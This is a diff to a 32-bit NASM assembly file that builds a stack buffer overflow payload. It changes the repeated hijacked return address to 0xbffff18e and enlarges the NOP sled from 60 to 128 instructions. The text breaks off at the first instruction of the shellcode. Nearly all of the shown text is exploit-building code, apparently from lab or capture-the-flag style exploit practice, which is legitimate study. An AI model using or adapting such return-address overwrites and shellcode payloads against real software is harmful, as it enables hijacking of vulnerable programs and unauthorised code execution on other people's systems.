@@ -1,12 +1,12 @@
 ; 32-bit mode. otherwise got wonky results (0x66 spammed in binary)
 bits 32
 
-; jump to 0xbffff148 + 50
-times 10 dd 0xbffff17a
+; jump to 0xbffff148 + 70
+times 10 dd 0xbffff18e
 
 ; more nops, JIC
 ; hijacked return should land in here somewhere
-times 60 nop
+times 128 nop
 
 ; shellcode
 xor eax, eax
